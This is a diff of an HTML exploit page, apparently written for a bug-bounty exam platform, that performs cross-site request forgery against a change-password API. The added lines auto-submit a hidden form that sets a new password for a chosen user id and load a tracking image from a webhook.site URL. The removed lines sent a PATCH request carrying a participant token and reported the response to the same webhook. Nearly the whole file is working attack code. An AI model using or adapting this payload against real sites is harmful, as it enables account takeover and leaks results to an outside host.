@@ -1,21 +1,19 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <img src="https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4">
+
+    <form id="exploit" action="https://api-bugbounty-exam.hashacademy.co/api/auth/change-password" method="POST">
+      <input type="hidden" name="id" value="69d28e841cda77b519a9550e" />
+      <input type="hidden" name="newPassword" value="Saja!Bounty@2026." />
+      <input type="hidden" name="confirmPassword" value="Saja!Bounty@2026." />
+    </form>
+
     <script>
-      fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/change-password', {
-        method: 'PATCH',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-Participant-Token': 'pt_1b3dc783f60b2febc8ec1cf75e880aac9d1d62c19b7fae1f0a143d6afbeb858c_7a3b42e022441584'
-        },
-        body: JSON.stringify({
-          "newPassword": "Hacked_Admin_2026!"
-          // Note: We omit currentPassword to see if the Admin's session bypasses that check
-        })
-      }).then(res => res.json()).then(data => {
-        // Send the result to your webhook so you know if it worked!
-        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?status=' + JSON.stringify(data));
-      });
+      // 2. Wait 1 second to ensure the tracking image fires, then submit
+      setTimeout(function(){
+        document.getElementById('exploit').submit();
+      }, 1000);
     </script>
   </body>
 </html>
